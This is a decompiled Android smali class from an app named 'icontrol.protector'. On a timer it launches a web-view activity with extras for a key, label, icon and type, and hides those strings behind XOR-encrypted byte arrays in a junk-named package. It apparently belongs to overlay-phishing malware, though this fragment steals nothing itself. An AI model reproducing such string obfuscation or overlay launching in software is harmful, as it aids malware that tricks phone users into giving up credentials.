.class Lcom/icontrol/protector/WorkServices$d$c;
.super Ljava/util/TimerTask;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WorkServices$d;->m(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Ljava/lang/String;

.field final synthetic g:Ljava/lang/String;

.field final synthetic h:[B

.field final synthetic i:Landroid/content/Context;

.field final synthetic j:Lcom/icontrol/protector/WorkServices$d;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/WorkServices$d;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[BLandroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/WorkServices$d$c;->j:Lcom/icontrol/protector/WorkServices$d;

    iput-object p2, p0, Lcom/icontrol/protector/WorkServices$d$c;->e:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/WorkServices$d$c;->f:Ljava/lang/String;

    iput-object p4, p0, Lcom/icontrol/protector/WorkServices$d$c;->g:Ljava/lang/String;

    iput-object p5, p0, Lcom/icontrol/protector/WorkServices$d$c;->h:[B

    iput-object p6, p0, Lcom/icontrol/protector/WorkServices$d$c;->i:Landroid/content/Context;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$c;->e:Landroid/content/Context;

    const-class v2, Lcom/icontrol/protector/WebBrowser;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v1, 0x3

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    iget-object v3, p0, Lcom/icontrol/protector/WorkServices$d$c;->f:Ljava/lang/String;

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    iget-object v3, p0, Lcom/icontrol/protector/WorkServices$d$c;->g:Ljava/lang/String;

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v1, 0x4

    new-array v3, v1, [B

    fill-array-data v3, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lcom/icontrol/protector/WorkServices$d$c;->h:[B

    invoke-virtual {v0, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[B)Landroid/content/Intent;

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v3, v2, [B

    fill-array-data v3, :array_7

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x1

    new-array v3, v3, [B

    const/4 v4, 0x0

    const/16 v5, -0x59

    aput-byte v5, v3, v4

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$c;->i:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    nop

    :array_0
    .array-data 1
        0x26t
        -0x2ct
        0x63t
    .end array-data

    :array_1
    .array-data 1
        0x4dt
        -0x4ft
        0x1at
        0x3bt
        0x2ft
        -0x4at
        -0x45t
        -0x7t
    .end array-data

    :array_2
    .array-data 1
        -0x25t
        0x35t
        0x2et
        0x58t
        0x29t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x49t
        0x54t
        0x4ct
        0x3dt
        0x45t
        0x78t
        -0x5at
        0x1at
    .end array-data

    :array_4
    .array-data 1
        -0x63t
        0x2bt
        -0x12t
        0x48t
    .end array-data

    :array_5
    .array-data 1
        -0xct
        0x48t
        -0x7ft
        0x26t
        -0x48t
        0x47t
        0x5t
        0x2ct
    .end array-data

    :array_6
    .array-data 1
        -0x73t
        0x61t
        0x50t
        0x3at
    .end array-data

    :array_7
    .array-data 1
        -0x7t
        0x18t
        0x20t
        0x5ft
        0x9t
        -0x14t
        -0x3t
        0x34t
    .end array-data

    :array_8
    .array-data 1
        -0x2et
        -0x22t
        0x44t
        -0xct
        -0xdt
        0x31t
        -0x52t
        0x2bt
    .end array-data
.end method
